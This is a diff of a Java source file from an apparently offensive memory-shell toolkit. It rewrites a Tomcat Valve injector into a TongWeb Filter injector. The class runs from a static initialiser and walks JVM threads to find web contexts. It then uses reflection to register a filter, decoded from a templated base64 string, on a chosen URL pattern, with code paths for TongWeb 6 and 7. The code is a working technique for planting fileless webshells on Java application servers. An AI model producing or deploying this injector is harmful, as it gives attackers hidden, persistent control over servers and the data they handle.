@@ -1,42 +1,30 @@
-package com.reajason.javaweb.memshell.tomcat.injector;
+package com.reajason.javaweb.memshell.tongweb.injector;
 
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.util.ArrayList;
-import java.util.Arrays;
 import java.util.HashMap;
 import java.util.List;
+import java.util.Map;
+import java.util.logging.Logger;
 import java.util.zip.GZIPInputStream;
 
 /**
- * Date: 2022/11/01
- * Author: pen4uin
- * Description: Tomcat Valve 注入器
- * Tested version：
- * jdk    v1.8.0_275
- * tomcat v8.5.83, v9.0.67
- *
  * @author ReaJason
  */
-public class TomcatValveInjector {
+public class TongWebFilterInjector {
+    Logger logger = Logger.getLogger(TongWebFilterInjector.class.getName());
 
     static {
-        new TomcatValveInjector();
+        new TongWebFilterInjector();
     }
 
-    public TomcatValveInjector() {
-        try {
-            List<Object> contexts = getContext();
-            for (Object context : contexts) {
-                Object valve = getShell(context);
-                inject(context, valve);
-            }
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
+    public String getUrlPattern() {
+        return "{{urlPattern}}";
     }
 
     public String getClassName() {
@@ -47,41 +35,33 @@ public class TomcatValveInjector {
         return "{{base64Str}}";
     }
 
-    @SuppressWarnings("all")
+    public TongWebFilterInjector() {
+        try {
+            List<Object> contexts = getContext();
+            for (Object context : contexts) {
+                Object filter = getShell(context);
+                inject(context, filter);
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
     public List<Object> getContext() throws Exception {
         List<Object> contexts = new ArrayList<Object>();
-        Thread[] threads = (Thread[]) invokeMethod(Thread.class, "getThreads", null, null);
+        Thread[] threads = (Thread[]) invokeMethod(Thread.class, "getThreads", new Class[0], new Object[0]);
         Object context = null;
         for (Thread thread : threads) {
-            // 适配 v5/v6/7/8
-            if (thread.getName().contains("ContainerBackgroundProcessor") && context == null) {
-                HashMap childrenMap = (HashMap) getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "children");
-                // 原: map.get("localhost")
-                // 之前没有对 StandardHost 进行遍历，只考虑了 localhost 的情况，如果目标自定义了 host,则会获取不到对应的 context，导致注入失败
+            if (thread.getName().contains("ContainerBackgroundProcessor")) {
+                HashMap<?, ?> childrenMap = (HashMap<?, ?>) getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "children");
                 for (Object key : childrenMap.keySet()) {
-                    HashMap children = (HashMap) getFieldValue(childrenMap.get(key), "children");
-                    // 原: context = children.get("");
-                    // 之前没有对context map进行遍历，只考虑了 ROOT context 存在的情况，如果目标tomcat不存在 ROOT context，则会注入失败
+                    HashMap<?, ?> children = (HashMap<?, ?>) getFieldValue(childrenMap.get(key), "children");
                     for (Object key1 : children.keySet()) {
                         context = children.get(key1);
                         if (context != null && context.getClass().getName().contains("StandardContext")) {
                             contexts.add(context);
                         }
-                        // 兼容 spring boot 2.x embedded tomcat
-                        if (context != null && context.getClass().getName().contains("TomcatEmbeddedContext")) {
-                            contexts.add(context);
-                        }
                     }
-                }
-            }
-            // 适配 tomcat v9
-            else if (thread.getContextClassLoader() != null && (thread.getContextClassLoader().getClass().toString().contains("ParallelWebappClassLoader") || thread.getContextClassLoader().getClass().toString().contains("TomcatEmbeddedWebappClassLoader"))) {
-                context = getFieldValue(getFieldValue(thread.getContextClassLoader(), "resources"), "context");
-                if (context != null && context.getClass().getName().contains("StandardContext")) {
-                    contexts.add(context);
-                }
-                if (context != null && context.getClass().getName().contains("TomcatEmbeddedContext")) {
-                    contexts.add(context);
                 }
             }
         }
@@ -105,32 +85,39 @@ public class TomcatValveInjector {
     }
 
     @SuppressWarnings("all")
-    public void inject(Object context, Object valve) throws Exception {
-        Object pipeline = invokeMethod(context, "getPipeline", null, null);
-        if (isInjected(pipeline)) {
-            System.out.println("valve already injected");
+    public void inject(Object context, Object filter) throws Exception {
+        if (invokeMethod(context, "findFilterDef", new Class[]{String.class}, new Object[]{getClassName()}) != null) {
+            logger.warning("filter already injected");
             return;
         }
+        String filterClassName = getClassName();
+        Object filterDef;
+        Object filterMap;
+        Constructor<?> constructor;
         try {
-            Class valveClass = context.getClass().getClassLoader().loadClass("org.apache.catalina.Valve");
-            invokeMethod(pipeline, "addValve", new Class[]{valveClass}, new Object[]{valve});
-        } catch (Exception e) {
-            e.printStackTrace();
+            // tongweb 7
+            filterDef = Class.forName("com.tongweb.web.util.descriptor.web.FilterDef").newInstance();
+            filterMap = Class.forName("com.tongweb.web.util.descriptor.web.FilterMap").newInstance();
+            constructor = Class.forName("com.tongweb.catalina.core.ApplicationFilterConfig").getDeclaredConstructors()[0];
+        } catch (Exception e2) {
+            // tongweb 6
+            filterDef = Class.forName("com.tongweb.web.thor.deploy.FilterDef").newInstance();
+            filterMap = Class.forName("com.tongweb.web.thor.deploy.FilterMap").newInstance();
+            constructor = Class.forName("com.tongweb.web.thor.core.ApplicationFilterConfig").getDeclaredConstructors()[0];
         }
-    }
+        invokeMethod(filterDef, "setFilterName", new Class[]{String.class}, new Object[]{filterClassName});
+        invokeMethod(filterDef, "setFilterClass", new Class[]{String.class}, new Object[]{filterClassName});
+        invokeMethod(context, "addFilterDef", new Class[]{filterDef.getClass()}, new Object[]{filterDef});
+        invokeMethod(filterMap, "setFilterName", new Class[]{String.class}, new Object[]{filterClassName});
+        invokeMethod(filterMap, "addURLPattern", new Class[]{String.class}, new Object[]{getUrlPattern()});
+        invokeMethod(context, "addFilterMapBefore", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
 
-    @SuppressWarnings("all")
-    public boolean isInjected(Object pipeline) throws Exception {
-        Object[] valves = (Object[]) invokeMethod(pipeline, "getValves", null, null);
-        List<Object> valvesList = Arrays.asList(valves);
-        for (Object valve : valvesList) {
-            if (valve.getClass().getName().contains(getClassName())) {
-                return true;
-            }
-        }
-        return false;
+        constructor.setAccessible(true);
+        Object filterConfig = constructor.newInstance(context, filterDef);
+        Map filterConfigs = (Map) getFieldValue(context, "filterConfigs");
+        filterConfigs.put(filterClassName, filterConfig);
+        logger.info("filter inject success");
     }
-
 
     @SuppressWarnings("all")
     public static byte[] decodeBase64(String base64Str) throws Exception {
@@ -170,23 +157,7 @@ public class TomcatValveInjector {
     }
 
     @SuppressWarnings("all")
-    public static Object getFieldValue(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
-        for (Class<?> clazz = obj.getClass();
-             clazz != Object.class;
-             clazz = clazz.getSuperclass()) {
-            try {
-                Field field = clazz.getDeclaredField(name);
-                field.setAccessible(true);
-                return field.get(obj);
-            } catch (NoSuchFieldException ignored) {
-
-            }
-        }
-        throw new NoSuchFieldException(name);
-    }
-
-    @SuppressWarnings("all")
-    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws NoSuchMethodException {
+    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) {
         try {
             Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
             Method method = null;
@@ -204,12 +175,27 @@ public class TomcatValveInjector {
             if (method == null) {
                 throw new NoSuchMethodException("Method not found: " + methodName);
             }
+
             method.setAccessible(true);
             return method.invoke(obj instanceof Class ? null : obj, param);
-        } catch (NoSuchMethodException e) {
-            throw e;
         } catch (Exception e) {
             throw new RuntimeException("Error invoking method: " + methodName, e);
         }
+    }
+
+    @SuppressWarnings("all")
+    public static Object getFieldValue(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
+        for (Class<?> clazz = obj.getClass();
+             clazz != Object.class;
+             clazz = clazz.getSuperclass()) {
+            try {
+                Field field = clazz.getDeclaredField(name);
+                field.setAccessible(true);
+                return field.get(obj);
+            } catch (NoSuchFieldException ignored) {
+
+            }
+        }
+        throw new NoSuchFieldException(name);
     }
 }
